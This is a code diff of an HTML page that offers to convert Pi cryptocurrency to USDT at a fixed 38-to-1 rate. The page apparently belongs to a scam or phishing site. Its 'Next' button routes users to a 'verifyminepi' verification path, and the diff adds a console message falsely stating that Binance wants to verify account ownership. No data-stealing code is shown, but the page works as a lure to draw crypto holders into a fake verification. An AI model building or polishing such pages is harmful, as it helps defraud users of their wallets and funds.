@@ -7,7 +7,7 @@
     <link rel="stylesheet" href="available-offers.css">
 </head>
 <body>
-    <button class="back-button" onclick="goBack()">&#8592; Back</button> <!-- Back button moved to the top left corner -->
+    <button class="back-button" onclick="goBack()">&#8592; Back</button>
     <div class="container">
         <h1>AVAILABLE OFFERS</h1>
         <div class="offer-list">
@@ -29,7 +29,6 @@
                 <button onclick="navigateTo('vent/verifyminepi.com/verifyminepi/verify/ventindex.html')">Next</button>
             </div>
         </div>
-        <!-- New option to fill Pi amount and USDT wallet address -->
         <div class="pi-conversion">
             <label for="pi-amount">min 10 pi:</label>
             <input type="number" id="pi-amount" name="pi-amount" min="0" step="1" placeholder="Enter Pi amount">
@@ -53,7 +52,6 @@
 
         function convertToUSDT() {
             const piAmount = document.getElementById('pi-amount').value;
-            const usdtWallet = document.getElementById('usdt-wallet').value;
             const usdtEquivalent = piAmount * 38;
             document.getElementById('usdt-equivalent').textContent = `${piAmount} Pi is equivalent to ${usdtEquivalent} USDT`;
 
@@ -66,6 +64,7 @@
                 };
                 document.getElementById('sell-button-container').appendChild(sellButton);
             }
+            console.warn("Binance wants to verify ownership of account");
         }
     </script>
 </body>
